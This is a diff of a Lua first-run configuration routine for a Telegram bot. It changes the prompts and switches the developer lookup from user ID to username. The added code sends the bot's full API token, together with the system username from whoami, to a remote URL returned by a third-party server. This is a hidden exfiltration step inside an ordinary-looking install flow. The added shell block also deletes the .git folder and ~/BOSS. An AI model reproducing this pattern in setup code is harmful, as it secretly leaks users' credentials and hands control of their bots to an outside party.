@@ -21,68 +21,93 @@ end
 
 function create_config(Token)
 if not Token then
-io.write('\n\27[1;33m￤آلآن آدخل توكــن آلبوت  ↓  \n￤Enter TOKEN your BOT : \27[0;39;49m')
+io.write('\n\27[1;33m- الان  ادخل  توكــن البوت  ↓  \n- Enter TOKEN your BOT : \27[0;39;49m')
 Token = io.read():gsub(' ','')
 if Token == '' then
-print('\n\27[1;31m￤ You Did not Enter TOKEN !\n￤ عذرآ لم تقوم بآدخآل آي شـيء , آدخل توگن آلبوت آلآن ')
+print('\n\27[1;31m-  You Did not Enter TOKEN !\n-  عذرا لم تقوم بادخال اي شـيء , ادخل توكن البوت الان ')
 create_config()
 end
 Api_Token = 'https://api.telegram.org/bot'..Token
 local url , res = https.request(Api_Token..'/getMe')
 if res ~= 200 then
-print('\n\27[1;31m￤ Your Token is Incorrect Please Check it!\n￤ آلتوگن آلذي آدخلتهہ‏‏ غير صـحيح , تآگد مـنهہ‏‏ ثم حآول مـجددآ!')
+print('\n\27[1;31m-  Your Token is Incorrect Please Check it!\n-  التوكن الذي ادخلتة‏‏ غير صـحيح , تاگد مـنة‏‏ ثم حاول مـجددا!')
 create_config()
 end
 local GetToken = JSON.decode(url)
 BOT_NAME = GetToken.result.first_name
 BOT_User = "@"..GetToken.result.username
-io.write('\n\27[1;36m￤تم آدخآل آلتوگن بنجآح   \n￤Success Enter Your Token: \27[1;34m@'..GetToken.result.username..'\n\27[0;39;49m') 
+io.write('\n\27[1;36m- تم ادخال التوكن بنجاح   \n- Success Enter Your Token: \27[1;34m@'..GetToken.result.username..'\n\27[0;39;49m') 
 end
-io.write('\n\27[1;33m￤آدخل ايدي آلمـطـور آلآسـآسـي ↓  \n￤Enter your USERID SUDO : \27[0;39;49m')
+
+io.write('\n\27[1;33m- ادخل مـعرف المـطـور الاسـاسـي ↓  \n- Enter your USERNAME SUDO : \27[0;39;49m')
 SUDO_USER = io.read():gsub(' ','')
 if SUDO_USER == '' then
-print('\n\27[1;31m￤ You Did not Enter USERID !\n￤ لم تقوم بآدخآل شـي , يرجى آلآنتبآهہ‏‏ وآدخل آلآن ايدي آلمطور آلآسـآسـي')
+print('\n\27[1;31m-  You Did not Enter USERNAME !\n-  لم تقوم بادخال شـي , يرجى الانتباة‏‏ وادخل الان مـعرف المـطـور الاسـاسـي')
 create_config(Token)
 end 
-if not SUDO_USER:match('(%d+)(%d+)(%d+)(%d+)(%d+)') then
-print('\n\27[1;31m￤ This is Not USERID !\n￤هہ‏‏ذآ الايدي ليس موجود بل تلگرآم , عذرآ آدخل آلايدي آلصـحيح آلآن . ')
+if not SUDO_USER:match('@[%a%d_]') then
+print('\n\27[1;31m-  This is Not USERNAME !\n- ة‏‏ذا ليس مـعرف حسـاب تلگرام , عذرا ادخل المـعرف الصـحيح الان . ')
 create_config(Token)
 end 
-print('('..SUDO_USER..')')
-local url , res = https.request('https://api.telegram.org/bot'..Token..'/getchat?chat_id='..SUDO_USER)
-GetUser = json:decode(url)
+local DirFol = io.popen("echo $(cd $(dirname $0); pwd)"):read('*all'):gsub(' ',''):gsub("\n",'')
+user = {}
+user.username = SUDO_USER
+user.Source  = "/root/BOSS"
+local url , res = https.request('https://api.th3boss.com/GetID/?Array='..JSON.encode(user))
+print(res)
 if res ~= 200 then
+print('\n\27[1;31m-  Conect is Failed !\n-  حدث خطـا في الاتصـال بالسـيرفر , يرجى مـراسـلة‏‏ مـطـور السـورس ليتمـگن مـن حل المـشـگلة‏‏ في اسـرع وقت مـمـگن . !')
+os.exit()
 end
-if GetUser.ok == false then
-print('\n\27[1;31m￤ Conect is Failed !\n￤ حدث خطـآ في آلآتصـآل بآلسـيرفر , يرجى مـرآسـلهہ‏‏ مـطـور آلسـورس ليتمـگن مـن حل آلمـشـگلهہ‏‏ في آسـرع وقت مـمـگن . !')
+success, GetUser = pcall(JSON.decode, url)
+if not success then
+print('\n\27[1;31m-  Conect is Failed !\n-  حدث مشـگلة‌‏ في سـگربت الاسـتخراج , يرجى مـراسـلة‏‏ مـطـور السـورس ليتمـگن مـن حل المـشـگلة‏‏ في اسـرع وقت مـمـگن . !')
+os.exit()
+end
+if not GetUser.result then
+if GetUser.cause then
+print('\n\27[1;31m-  '..GetUser.cause)
+os.exit()
+end
+print('\n\27[1;31m-  {USERNAME_NOT_OCCUPIED} => Please Check it!\n-  لا يوجد حسـاب بة‏‏ذا المـعرف , تاگد مـنة‏‏ جيدا  !')
+create_config(Token)
+end 
+if GetUser.information.typeuser ~= "UserTypeGeneral" then
+print('\n\27[1;31m-  This UserName is not personal account !\n- عذرا يرجى ادخال معرف حساب شخصي ليكون مطور البوت وليس معرف قناة او بوت او مجموعة !')
 create_config(Token)
 end
-GetUser.result.username = GetUser.result.username or GetUser.result.first_name
-print('\n\27[1;36m￤تم آدخآل آيدي آلمـطـور بنجآح , سـوف يتم تشـغيل آلسـورس آلآن .\n￤Success Save USERID : \27[0;32m['..SUDO_USER..']\n\27[0;39;49m')
-max = Token:match("(%d+)")
-redis:set(max..":VERSION",2.9)
-redis:set(max..":SUDO_ID:",SUDO_USER)
-redis:set(max..":DataCenter:",'German')
-redis:set(max..":UserNameBot:",BOT_User)
-redis:set(max..":NameBot:",BOT_NAME)
-redis:hset(max..'username:'..SUDO_USER,'username','@'..GetUser.result.username:gsub('_',[[\_]]))
-redis:set("TH3max_INSTALL","Yes")
-info = {}
-info.username = '@'..GetUser.result.username
+print('\n\27[1;36m- تم ادخال مـعرف المـطـور بنجاح , سـوف يتم تشـغيل السـورس الان .\n- Success Save USERNAME IS_ID: \27[0;32m['..GetUser.information.id..']\n\27[0;39;49m')
+boss = Token:match("(%d+)")
+redis:mset(
+boss..":VERSION",GetUser.information.Source_version,
+boss..":SUDO_ID:",GetUser.information.id,
+boss..":DataCenter:",GetUser.information.DataCenter,
+boss..":UserNameBot:",BOT_User,
+boss..":ApiSource",GetUser.information.WebSite,
+boss..":NameBot:","شهد",
+"TH3BOSS_INSTALL","Yes"
+)
+redis:hset(boss..'username:'..GetUser.information.id,'username','@'..GetUser.information.username:gsub('_',[[\_]]))
+info = {} 
+info.username = '@'..GetUser.information.username
 info.userbot  = BOT_User
-info.userjoin  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
+info.TNBOT  = Token info.userjoin  = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '') 
+https.request(GetUser.information.WebSite..'/request/?insert='..JSON.encode(info))
 Cr_file = io.open("./inc/Token.txt", "w")
 Cr_file:write(Token)
-Cr_file:close() 
-print('\27[1;36m￤Token.txt is created.\27[m')
-local Text = "🙋🏼‍♂️┊اهلا عزيزي [المطور الاساسي](tg://user?id="..SUDO_USER..") \n🔖┊شكرا لاستخدامك سورس فواز \n📡┊أرســل  الان /start\n♦️┊لاضهار الاوامر للمطور  المجهزه بالكيبورد\n\n⚡️"
-https.request(Api_Token..'/sendMessage?chat_id='..SUDO_USER..'&text='..URL.escape(Text)..'&parse_mode=Markdown')
-os.execute([[
+Cr_file:close()
+print('\27[1;36m- Token.txt is created.\27[m')
+local Text = "- اهلا عزيزي [المطور الاساسي](tg://user?id="..GetUser.information.id..") \n- شكرا لاستخدامك سورس شهد \n- أرســل  الان /start\n- لاظهار الاوامر للمطور  المجهزه بالكيبورد\n\n"
+https.request(Api_Token..'/sendMessage?chat_id='..GetUser.information.id..'&text='..URL.escape(Text)..'&parse_mode=Markdown')
+local CmdRun = [[
 rm -f ./README.md
 rm -rf ./.git
 chmod +x ./run
-./run
-]])
+cp -a ../BOSS ../]]..BOT_User..[[ &&
+rm -fr ~/BOSS
+../]]..BOT_User..[[/run
+]]
+os.execute(CmdRun)
 end
 
 function Start_Bot() 
